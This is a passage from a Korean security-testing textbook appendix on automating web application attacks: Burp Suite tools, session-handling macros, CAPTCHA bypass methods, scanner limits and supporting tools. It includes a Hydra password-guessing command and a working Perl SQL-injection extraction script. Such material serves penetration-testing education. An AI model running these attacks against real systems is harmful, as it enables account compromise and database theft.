페이로드 생성 함수로는 미리 설정된 목록, 구문 스킴 기반 커스텀 반복(예: `ABC45D` 형식 사용자명 전수), 문자·대소문자 치환(`password` → `p4ssword`), 십진·16진 숫자(순차·증분·무작위), 날짜, 불법 유니코드 인코딩, 문자 블록(버퍼 오버플로 탐침), 무차별 대입기 등이 있다. 각 페이로드에 인코딩·해싱 같은 처리 규칙도 걸 수 있다. 기본적으로 요청을 무효화할 문자는 URL 인코딩된다.

응답 분석에서 Intruder는 기본으로 상태 코드, 응답 길이, 설정된 쿠키, 응답 시간을 기록한다 — 히트 탐지 여섯 채널(B.2.2) 중 다섯을 기본 제공하는 셈이다. 여기에 검색할 문자열·정규식을 지정하고, 데이터 추출 문자열을 설정하며, 응답에 공격 페이로드 자체가 담겼는지 검사(XSS 등 반향형 취약점 식별)하게 할 수 있다. 결과는 표로 표시되며 열 머리글로 정렬해 히트를 빠르게 가려낸다. **상태 코드가 신뢰할 만한 히트 지표라도 응답 길이 열은 항상 함께 살펴야 한다.** 예상 못 한 차이 — 예컨대 더 긴 홈페이지가 더 높은 권한의 세션을 가리키는 것 — 를 응답 길이가 드러내기 때문이다.

### B.5.4 스파이더, 리피터, 시퀀서, 그리고 프록시의 대안

스파이더는 페이지를 요청·파싱해 링크를 따라가며 콘텐츠를 발견한다. 폼 기반·JavaScript 기반 내비게이션, 다단계 기능, 인증·세션, 파라미터 기반 식별자 등 애플리케이션 특유의 문제를 다뤄야 한다. 프록시와 데이터를 공유해, 브라우저로 정상 사용하는 동안 수동적으로 사이트맵을 채우는 사용자 주도 스파이더링이 핵심이다(→ 25.1). 스파이더 범위는 세밀히 통제해야 한다. 관리 인터페이스를 크롤링해 계정을 삭제하거나 로그아웃 기능을 요청해 자기 세션을 무효화하는 일을 막아야 한다.

리피터는 단일 요청을 발행하고 응답을 보는 기본 기능이다. 잠정 취약점을 탐침하며 요청 요소를 조금씩 바꿔 애플리케이션 동작의 변화를 확인할 때 유용하다. 시퀀서는 세션 쿠키 같은 토큰의 무작위성을 통계적으로 검정한다(→ 23.2).

인터셉팅 프록시를 쓸 수 없는 드문 상황 — 비표준 인증, 특이한 클라이언트 인증서, 브라우저 확장 — 을 위해 대안을 갖춰야 한다. 브라우저 내부 도구(Firefox의 Tamper Data, IE의 TamperIE 등)로 브라우저가 생성하는 요청을 감시·조작하는 것이다. 이들은 네트워크 계층 통신에 개입하지 않아 브라우저가 문제 있는 애플리케이션과 평소대로 통신하게 두면서도 임의 요청을 제출하게 해 준다. 다만 스파이더링·퍼징·스캐닝은 하지 못하고 완전히 수동으로만 작동한다. XSS와 클라이언트 측 공격을 정밀하게 조작할 때는 Firebug 같은 브라우저 디버깅 도구로 DOM을 실시간 편집하고, 브라우저 자체를 겨냥한 익스플로잇 프레임워크로 넘어가기도 한다(→ 36.7).

>
> - 프록시의 자발적 MITM과 CA 인증서 → **19.9** (TLS가 무엇을 더하는가), **13.10** (CONNECT 터널)
> - Intruder의 응답 분석 기본값 → **B.2.2** (히트 탐지 채널의 도구 구현)

## B.6 자동화의 장벽 — 세션 핸들링 메커니즘, CAPTCHA

지금까지의 기법이 문제없이 적용되는 애플리케이션이 많다. 그러나 맞춤 자동화를 곧이곧대로 수행하지 못하게 막는 장벽을 만날 때도 있다. 장벽은 대개 두 범주다. **세션 핸들링 메커니즘**과 **CAPTCHA**다. 이 두 방어가 어떻게 자동화를 막는지는 본문에서 이미 다뤘다 — 23.7절이 세션 핸들링을, 22.10절이 CAPTCHA를 다뤘다. 여기서는 **자동화 도구 측면**에서 그 장벽을 어떻게 넘는지에 집중한다.

### B.6.1 세션 핸들링 메커니즘

세션 핸들링과 상태 기반 기능은 자동 테스트에 문제를 일으킨다(→ 23.7). 대표적으로 세 가지다.

- 요청을 시험하는 도중 애플리케이션이 — 방어적으로든 다른 이유로든 — 테스트용 세션을 종료해 이후 테스트가 무효가 된다.
- 요청 위조를 막기 위해 매 요청마다 바뀌는 토큰(anti-CSRF 토큰)을 제출해야 한다(→ 33.4).
- 시험 대상 요청이 다단계 프로세스 안에 있어, 앞선 일련의 요청으로 애플리케이션을 적절한 상태로 만들어야만 제대로 처리된다.

원리상 이런 장벽은 자동화 기법을 정교하게 다듬어 언제든 넘을 수 있다. B.2의 엔진 같은 자체 코드를 쓴다면 특정 토큰 처리나 다단계 메커니즘을 직접 구현하면 된다. 그러나 이 접근은 복잡하고 대규모 애플리케이션에 잘 확장되지 않는다. 새 사례마다 새 코드를 짜야 한다는 것 자체가 자동화의 장벽이 되어, 느린 수작업으로 되돌아가게 만든다.

Burp Suite는 이 상황을 매끄럽게 처리하는 기능을 세 구성 요소로 제공한다.

- **쿠키 항아리(cookie jar)** — 브라우저와 Burp 도구가 쓰는 애플리케이션 쿠키를 추적한다. 그 자체로는 아무 일도 하지 않지만, 추적한 값이 다른 구성 요소에서 쓰인다.
- **요청 매크로(request macro)** — 미리 정의된 요청 시퀀스. 세션 유효성 확인, 재로그인, 토큰·nonce 획득, 다단계 프로세스에서 표적 요청 전에 필요한 선행 요청 수행 등에 쓴다. 매크로는 브라우저로 기록하며, 한 요청의 응답에서 값을 뽑아 다음 요청의 파라미터로 넘길 수 있다. 이것이 aggressive한 anti-CSRF 토큰과 다단계 프로세스를 다루는 핵심이다.
- **세션 핸들링 규칙(session-handling rule)** — 범위(무엇에 적용되는가)와 동작(무엇을 하는가)으로 구성된다. Burp가 내보내는 매 요청마다 범위에 드는 규칙을 찾아 그 동작을 순서대로 수행한다. 동작에는 쿠키 항아리에서 쿠키 추가, 특정 쿠키·파라미터 값 설정, 현재 세션 유효성 검사 후 조건부 하위 동작, 매크로 실행, 브라우저 내 세션 복구 요청 등이 있다.

예를 들어 세션을 자주 종료하고 `csrf_token`을 폭넓게 쓰는 애플리케이션이라면 다음 규칙을 정의한다.

1. 모든 요청에 대해, 쿠키 항아리의 쿠키를 추가한다.
2. 해당 도메인 요청에 대해, 세션이 유효한지 검사한다. 무효면 재로그인 매크로를 실행하고 결과 세션 토큰으로 쿠키 항아리를 갱신한다.
3. `csrf_token` 파라미터를 담은 요청에 대해, 먼저 유효한 토큰 값을 얻는 매크로를 실행하고 그 값을 요청에 쓴다.

설정이 복잡해 실수가 잦으므로, 세션 핸들링 규칙이 요청에 적용되는 모든 단계를 보여 주는 추적기(tracer)로 디버깅한다. 규칙과 매크로를 설정·검증하고 나면, 장벽이 없는 것처럼 수동·자동 테스트를 이어 갈 수 있다.

### B.6.2 CAPTCHA 통제

CAPTCHA는 특정 기능(계정 등록, 블로그 댓글 등)의 자동 사용을 막도록 설계된 통제다. "Completely Automated Public Turing test to tell Computers and Humans Apart"의 약자로, 대개 일그러진 단어를 읽어 입력하게 하는 퍼즐이다. 사람에겐 쉽고 컴퓨터엔 어렵도록 설계된다. 스패머의 우회 동기와 이를 막으려는 방어 사이에 군비 경쟁이 벌어져, 퍼즐이 점점 사람에게도 어려워지는 역설이 생겼다(→ 22.10). CAPTCHA는 보안 테스트 맥락에서 여러 방식으로 우회할 수 있다.

**구현을 공격하기.** 가장 결실이 큰 곳은 퍼즐이 전달되고 답이 처리되는 구현이다. 놀랄 만큼 많은 구현이 답을 텍스트 형태로 클라이언트에 노출한다.

- 퍼즐 이미지 URL이 답을 파라미터로 담거나, 이미지 이름이 곧 답이다.
- 답이 히든 폼 필드에 저장된다.
- 답이 디버깅 목적의 HTML 주석 등에 나타난다.

이 경우 스크립트로 답을 담은 응답을 회수해 다음 요청에 제출하는 것이 쉽다. 또 흔한 버그는 퍼즐을 한 번 손으로 풀면 그 답을 여러 요청에 재생할 수 있는 것이다. 각 퍼즐은 한 번의 시도에만 유효해야 하고 답을 받으면 폐기해야 하는데, 그러지 않으면 정상적으로 한 번 풀어 무제한 자동 요청에 재사용할 수 있다. 어떤 애플리케이션은 인가된 자동 프로세스를 위해 CAPTCHA를 우회하는 코드 경로를 일부러 두는데, 이때 관련 **파라미터 이름을 아예 보내지 않는** 것만으로 우회되기도 한다.

**퍼즐을 자동으로 풀기.** 원리상 대부분의 CAPTCHA는 컴퓨터로 풀 수 있고, 실제로 여러 고프로필 알고리즘이 이런 식으로 무력화됐다. 일그러진 단어 퍼즐 풀이는 (1) 이미지 노이즈 제거, (2) 개별 글자로 분할, (3) 각 분할의 글자 인식의 세 단계다. 오늘날 컴퓨터는 노이즈 제거와 올바르게 분할된 글자 인식에 능하다. 가장 어려운 것은 글자가 겹치고 심하게 일그러졌을 때의 **분할**이다. 단순한 퍼즐이면 자작 코드로 노이즈를 제거하고 기존 OCR 라이브러리에 넘겨 글자를 인식할 수 있다. 동물·사물 인식형 퍼즐은 재사용되는 이미지 DB를 쓰므로, DB가 충분히 작으면 충분한 수를 손으로 풀어 두고 퍼지 이미지 해시·색 히스토그램 비교로 매칭한다.

여기서 중요한 점은, CAPTCHA를 무력화하는 데 **완벽한 정확도가 필요 없다**는 것이다. 10%만 맞혀도 자동 보안 테스트나 스팸 전달에는 충분히 효과적일 수 있다. 열 배의 요청이 드는 자동 작업도 대응하는 수작업보다 여전히 빠르다.

**사람 해결자 이용.** 대량의 CAPTCHA를 풀어야 하는 범죄자는 보안 테스트 맥락에 적용되지 않는 기법을 쓰기도 한다. 겉보기 무해한 사이트로 사람 프록시를 유인해 표적에서 실시간으로 가져온 퍼즐을 풀게 하거나, 개발도상국의 사람 해결자에게 1,000개당 1달러도 안 되는 값에 풀게 하는 것이다.

> - CAPTCHA의 효과와 한계 → **22.10** (여기서는 우회 기법)
> - 매크로의 anti-CSRF 토큰 처리 → **33.4** (CSRF 방어 토큰)

## B.7 취약점 스캐너 — 기술적 한계와 사용법

독립형 취약점 스캐너는 애플리케이션 스파이더링, 기본·흔한 콘텐츠 발견, 흔한 취약점 탐침을 자동화한다. 콘텐츠를 매핑한 뒤 각 요청의 각 파라미터에 시험 문자열 범위를 제출하고, 응답에서 흔한 취약점의 시그니처를 분석한다. 스캐너를 언제 쓸지 결정하는 핵심은 그 **내재적 강점과 약점**을 이해하는 것이다.

### B.7.1 스캐너가 찾을 수 있는 것과 없는 것

스캐너는 **표준 시그니처가 있는** 취약점을 어느 정도 신뢰성 있게 탐지한다. 시그니처는 정상 요청·응답 안에 존재하거나, 스캐너가 시그니처를 유발하도록 조작한 요청에 대한 응답에 나타난다.

**표 B-3. 스캐너의 탐지 가능/불가능 경계**

| 탐지 가능 (표준 시그니처 존재) | 탐지 불가 (시맨틱 이해 필요) |
|---|---|
| 반사형 XSS (마크업 반향) | 접근 제어 결함 (→ 24.3) |
| 일부 SQL 인젝션 (오류 메시지·시간 지연) | 파라미터 의미 조작 (가격·주문 상태 변경) |
| 일부 경로 순회 (알려진 파일 반향) | 그 밖의 로직 결함 (→ 29.1) |
| 일부 명령 인젝션 (시간 지연·문자열 반향) | 설계 취약점 (약한 비밀번호 규칙, 사용자명 열거) |
| 디렉터리 리스팅 | 세션 하이재킹 (토큰의 순서성) (→ 23.2) |
| 평문 비밀번호 전송, 관대한 쿠키, autocomplete | 민감 정보 누출 (사용자명·토큰 목록) |
| 백업·소스 파일 (확장자 변형 요청) | 다단계 프로세스 관련 결함 |

오른쪽 열은 12.11절(WAF의 한계)과 **같은 구조로** 판정해야 한다. WAF가 개별 요청의 구문만 보고 애플리케이션의 의도를 모르듯, 스캐너도 구문(syntax)만 분석할 뿐 의미(semantics)를 이해하지 못한다. 장바구니 갱신 기능에서 스캐너는 여러 파라미터가 제출되는 것만 볼 뿐, 하나가 수량이고 다른 하나가 가격이라는 것을, 그리고 가격 변경이 보안 결함이라는 것을 모른다.

접근 제어 결함이 대표적이다(→ 24.3). 스캐너는 애플리케이션의 접근 제어 요구사항을 이해하지 못하고, 특정 계정으로 발견한 기능·데이터의 중요도를 평가하지 못한다. 로직 결함도 마찬가지다(→ 29.1). 음수 값으로 거래 한도를 넘거나 핵심 파라미터를 생략해 계정 복구 단계를 건너뛰는 것 같은 결함은 표준 시그니처가 없다. **이런 결함은 소스 코드에서 찾는 편이 낫다**(→ 부록 C). 스캐너로부터 깨끗한 결과를 받았다는 것이 심각한 취약점의 부재를 보장하지 않는다. 손으로 하는 어떤 공격이든 잡아낼 **낮게 달린 과일**조차 스캐너가 놓칠 수 있다.

### B.7.2 내재적 한계와 기술적 도전

최고의 스캐너를 전문가가 만들었음에도 여러 취약점 범주를 신뢰성 있게 탐지하지 못하는 것은 우연이 아니다. 완전 자동 접근에는 근본 장벽이 있다.

- **모든 웹 애플리케이션은 다르다.** 네트워크 인프라와 달리 맞춤 애플리케이션은 미리 모든 표적의 결함 DB를 만들 수 없다. 효과적인 스캐너는 예상 밖을 예상해야 한다.
- **스캐너는 구문 위에서 동작한다.** 오류 메시지·상태 코드·반향된 데이터는 인식하지만, 그 내용의 의미를 이해하거나 규범적 판단을 내리지 못한다.
- **스캐너는 즉흥적으로 대응하지 못한다.** 비표준 세션·내비게이션 메커니즘을 사람은 빠르게 해체하지만 컴퓨터는 주어진 규칙만 따른다. 부분적으로만 효과적인 입력 필터를 우회하거나 여러 동작을 조합해야 하는 공격을 놓친다.
- **스캐너는 직관이 없다.** 모든 함수에 모든 공격을 시도하는 방식이라 조합에 실질적 한계가 있다. 다단계 프로세스의 특정 단계에 조작 입력을 넣고 나머지를 진행하며 관찰하거나, 여러 파라미터를 조작된 방식으로 함께 바꾸는 공격을 놓친다.

기술적 도전도 있다. 인증·세션 핸들링을 다뤄야 하고(세션이 무효가 됐음을 감지해 재획득해야 한다), 관리 기능을 무분별하게 요청해 데이터를 파괴하는 **위험한 부작용**을 피해야 하며, eBay·Amazon처럼 방대한 콘텐츠가 소수의 실제 기능에 대응하는 것을 알아보는 **기능 개별화**를 해내야 한다. 순전히 구문적 분석은 같은 취약점을 중복 보고하기 쉽다. 한 XSS 결함이 다른 맥락에서 반복 탐침돼 200건으로 부풀려지는 식이다.

### B.7.3 스캐너 사용법

흔한 취약점 중 스캐너가 원리상 발견 가능한 것은 표준 시그니처가 있는 약 절반이다. 그 부분집합 안에서도 개별 사례는 잘 잡되 미묘하고 이례적인 인스턴스는 놓친다. 자동 스캔은 전형적 애플리케이션의 낮게 달린 과일 일부를 — 전부는 아니고 — 식별한다고 기대하면 된다. 효과적으로 쓰려면 다음을 지킨다.

- 스캐너가 탐지할 수 있는 취약점과 없는 취약점을 구분해 인식한다.
- 스캐너의 기능과 설정을 숙지해 대상에 맞게 활용한다.
- 스캔 전에 표적 애플리케이션을 먼저 파악한다.
- 강력한 기능 스파이더링과 위험한 버그 자동 탐침의 위험을 인지한다.
- **스캐너가 보고한 잠재 취약점은 항상 손으로 확인한다.**
- 스캐너는 매우 시끄러워 서버·IDS 로그에 큰 흔적을 남긴다. 은밀해야 한다면 쓰지 않는다.

가장 효과적인 사용법은 통합 스위트 안의 스캐너를 **수동 테스트를 보조·강화**하는 데 쓰는 것이다(→ B.5). 브라우저로 스캐너를 안내해 핵심 기능을 빠뜨리지 않게 하고, 애플리케이션이 요구하는 올바른 형식의 실제 요청을 직접 스캔하며, 위험한 기능을 피하고 중복 기능을 알아보며, 인증·세션·다단계 문제를 제대로 처리한다. 이렇게 자동화 가능한 취약점 범위를 스캐너가 감당하게 하면, 인간의 지능과 경험이 필요한 취약점을 찾는 데 시간을 돌릴 수 있다.

> **이 절이 뒷받침하는 것**
>
> - 스캐너가 못 찾는 것 = 시맨틱 이해가 필요한 것 → **12.11** (WAF의 한계와 같은 구조), **29.1** (로직 결함), **24.3** (접근 제어)
> - 시그니처 없는 결함은 코드에서 → **부록 C** (소스 코드 리뷰)
> - 스캐너의 토큰 순서성 미이해 → **23.2** (예측 가능한 토큰)

## B.8 그 밖의 도구

앞의 도구 외에도 특정 상황이나 작업에 유용한 도구가 많다. 여기서는 자주 만나는 몇 가지를 간단히 짚는다. 이들은 대개 스크립트에서 호출되어 맞춤 자동화의 부품이 된다.

**Nikto / Wikto.** 웹 서버의 기본·흔한 제3자 콘텐츠를 찾는다. 웹 서버 기본 페이지·스크립트, 쇼핑카트 소프트웨어 같은 항목의 대규모 DB를 담고 각 항목을 요청해 존재 여부를 탐지한다. 커스텀 "not found" 페이지가 있으면 `-404` 설정으로 그 문자열을 지정해 거짓 양성을 피한다. Wikto는 Windows 버전으로 커스텀 "not-found" 탐지와 Google 기반 디렉터리 마이닝을 더한다.

**Hydra.** 폼 기반 인증에 쓰는 비밀번호 추측 도구. 대상 URL, 요청 파라미터, 사용자명·비밀번호 워드리스트, 실패 시 오류 메시지, 병렬 스레드 수(`-t`)를 지정한다.

```
hydra -t 32 -L users.txt -P passwords.txt wahh-app.com \
  http-post-form "/login.asp:login_name=^USER^&login_password=^PASS^&login=Login:Invalid"
```

**Wget / Curl.** 지정 URL을 HTTP·HTTPS로 회수한다. Curl은 GET·POST, 요청 파라미터, 클라이언트 SSL 인증서, HTTP 인증을 지원하는 가장 유연한 명령줄 도구다. 다음은 페이지 ID 10~40의 제목을 뽑는다.

```bash
#!/bin/bash
for i in $(seq 10 40); do
  echo -n "$i: "
  curl -s "http://mdsec.net/app/ShowPage.ashx?PageNo=$i" \
    | grep -Po "<title>(.*)</title>"
done
```

**Netcat.** TCP 커넥션을 열어 요청을 보내고 응답을 받는 다목적 도구. 공격 대상 서버로부터의 커넥션을 받는 네트워크 리스너를 만들어 대역 외(out-of-band) 채널을 여는 데도 쓴다(→ 27.6, 27.7). 자체적으로 SSL을 지원하지 않으므로 Stunnel과 조합한다.

**Stunnel.** SSL을 지원하지 않는 스크립트·도구에 HTTPS 능력을 준다. HTTPS는 SSL 위로 터널링된 HTTP일 뿐이므로, Stunnel로 로컬 포트를 만들고 그 뒤로 SSL 터널을 붙이면 어떤 도구든 HTTPS로 통신하게 된다.

```
stunnel -c -d localhost:88 -r wahh-app.com:443
```

이제 SSL을 못 하는 도구를 루프백 88 포트로 향하게 하면 목적지 서버와 사실상 HTTPS로 통신한다.

**커스텀 스크립트.** 기성 도구가 대부분의 작업을 감당하지만, 이례적인 상황에서는 직접 만든 도구가 가장 빠른 해결이다. 페이지별 토큰을 정해진 순서로 재제출해야 하는 특이한 세션 핸들링, 한 응답의 데이터를 다음 요청에 넣어 여러 단계를 반복해야 하는 익스플로잇, 소유자에게 위험을 시연할 "클릭 한 번" 익스플로잇 등이다. Python·Perl 같은 언어의 HTTP 라이브러리로 몇 줄이면 맞춤 작업을 수행할 수 있다. 다음은 검색 폼의 SQL 인젝션을 이용해 지정 컬럼의 모든 값을 높은 값부터 재귀적으로 뽑아내는 Perl 스크립트다(→ 27.6).

```perl
use HTTP::Request::Common;
use LWP::UserAgent;
$ua = LWP::UserAgent->new();
my $col = $ARGV[1];
my $from_stmt = $ARGV[3];
my $test = "";
while (1) {
    my $payload = "foo' or (1 in (select max($col) from $from_stmt $test))--";
    my $req = POST "http://mdsec.net/addressbook/32/Default.aspx",
        [ Name => $payload, Email => 'a@b.com', Search => 'Search' ];
    my $content = $ua->request($req)->as_string;
    if ($content =~ /nvarchar value '(.*)'/) {
        print "$1\n";
        $test = "where $col < '$1'";
    } else { exit; }
}
```

이런 커스텀 도구는 Burp Extender나 WebScarab의 BeanShell 인터페이스로 스위트의 확장으로 만들 수도 있다.

> **범위를 넘어서**
>
> 여기서 든 원리 — 요청 구조화, 페이로드 주입, 히트 탐지, 응답 추출 — 는 현대 API 도구에서 그대로 되풀이된다. GraphQL의 스키마 추출 자동화(→ 39.4, InQL), 인트로스펙션이 막혔을 때의 필드 제안 자동화(→ 39.6, Clairvoyance), DoS 벡터 감사(→ 40.5, GraphQL Cop)는 모두 이 부록의 열거·수확·퍼징 구조를 새 프로토콜에 옮긴 것이다. 도구 이름과 대상 문법은 바뀌었지만 자동화의 골격은 같다.

## 이 부록의 요약

- **맞춤 자동화는 인간의 지능과 컴퓨터의 무차별 반복을 결합한다.** 새 취약점이 아니라, 손으로 하기엔 요청 수가 너무 많은 작업을 자동화하는 방법론이다.
- **세 가지 용도가 골격이다** — 유효한 식별자 열거, 유용한 데이터 수확, 흔한 취약점 퍼징. 셋은 요청 구조화·페이로드 주입·응답 판정이라는 공통 엔진을 공유한다.
- **히트 탐지가 식별자 열거의 핵심이다.** 상태 코드·응답 길이·응답 본문·Location 헤더·Set-Cookie 헤더·응답 시간 — 이 여섯 채널 중 신뢰할 수 있는 하나 또는 함께 신뢰할 수 있는 한 무리를 찾는다.
- **퍼징은 취약점 유형별 페이로드와 판정 기준의 문제다.** SQL 인젝션·명령 인젝션은 오류·지연으로, XSS는 반향으로, 경로 순회는 파일 내용으로 판정한다. 한 번에 한 파라미터씩 변형해야 원인을 특정할 수 있다.
- **통합 스위트가 자체 코드의 한계를 넘는다.** 인터셉팅 프록시가 심장이고, Intruder·스파이더·리피터·시퀀서·스캐너가 정보를 공유한다. Intruder의 응답 분석 기본값은 히트 탐지 여섯 채널의 도구 구현이다.
- **자동화의 두 장벽은 세션 핸들링과 CAPTCHA다.** 쿠키 항아리·매크로·세션 핸들링 규칙으로 세션 종료와 anti-CSRF 토큰을 넘고, CAPTCHA는 구현 결함(답 노출, 답 재생)을 공격하거나 불완전한 정확도로도 무력화한다.
- **스캐너는 구문만 본다.** 시맨틱 이해가 필요한 접근 제어·로직 결함·다단계 프로세스는 원리상 찾지 못한다. WAF의 한계와 같은 구조로 판정한다. 보고된 취약점은 항상 손으로 확인한다.
- **기성 도구가 대부분을 감당하지만, 이례적 상황에서는 커스텀 스크립트가 가장 빠르다.** Netcat·Stunnel·Curl 같은 부품을 조합해 몇 줄로 맞춤 작업을 짠다.
